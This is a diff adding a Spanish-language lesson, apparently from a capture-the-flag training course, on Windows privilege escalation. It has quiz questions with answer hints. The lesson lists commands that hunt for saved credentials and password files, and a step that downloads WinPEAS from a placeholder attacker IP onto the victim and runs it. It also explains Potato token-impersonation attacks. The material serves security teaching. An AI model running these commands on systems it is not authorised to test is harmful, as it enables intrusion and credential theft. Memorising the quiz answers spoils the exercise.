@@ -1,0 +1,69 @@
+---
+index: 1
+title: "Enumeración: WinPEAS y la lista manual"
+questions:
+  - id: privesc-windows-t01-q01
+    prompt: "¿Qué comando muestra TUS privilegios actuales (busca SeImpersonate!)?"
+    hint: "whoami /priv"
+    kind: text
+  - id: privesc-windows-t01-q02
+    prompt: "¿Qué privilegios permiten impersonar tokens de otros procesos (el ataque Potato)?"
+    hint: "SeImpersonatePrivilege o SeAssignPrimaryTokenPrivilege."
+    kind: text
+  - id: privesc-windows-t01-q03
+    prompt: "¿Qué tarea de Windows lista los servicios con su cuenta de ejecución y ruta del binario?"
+    hint: "wmic service get name,startname,pathname o Get-Service + Get-CimInstance."
+    kind: text
+---
+
+## La lista manual de privesc Windows
+
+```cmd
+:: Identidad y privilegios
+whoami /all                        :: usuario, grupos Y PRIVILEGIOS
+whoami /priv                       :: SOLO privilegios (¡SeImpersonate!)
+
+:: Servicios y rutas
+wmic service get name,startname,pathname | findstr /i "localSystem"
+
+:: Tareas programadas
+schtasks /query /fo LIST /v | findstr /i "task to run"
+
+:: Parches instalados (¿falta algún hotfix crítico?)
+wmic qfe list                      :: si falta KBxxx → kernel exploit
+
+:: Credenciales en el sistema
+cmdkey /list                       :: credenciales guardadas
+dir /s /p C:\Users\*password* C:\Users\*.env
+findstr /si password *.txt *.ini *.cfg
+```
+
+## WinPEAS: el LinPEAS de Windows
+
+```powershell
+# En tu máquina:
+python3 -m http.server 8080
+# En la víctima (PowerShell):
+iwr http://TU_IP:8080/winPEASx64.exe -Outfile C:\Windows\Temp\winpeas.exe
+C:\Windows\Temp\winpeas.exe
+```
+
+WinPEAS resalta en rojo/amarillo los vectores probables. Su estructura sigue las
+mismas categorías que este room.
+
+## El privilegio que buscas: SeImpersonate
+
+```text
+PRIVILEGES INFORMATION
+----------------------
+SeImpersonatePrivilege        enabled     ← ¡ATAQUE POTATO!
+SeChangeNotifyPrivilege       enabled
+SeCreateGlobalPrivilege       enabled
+```
+
+Si tu shell (típicamente un servicio web) tiene **SeImpersonatePrivilege**, puede
+"suplantar" a cualquier cliente que se conecte a él. Los ataques **Potato**
+(Juicy Potato, Rogue Potato, SweetPotato) engañan al servicio de Windows Update para
+que se conecte a TU proceso, robando su token SYSTEM.
+
+Es LA escalada más común en servicios web Windows (IIS, SQL Server).
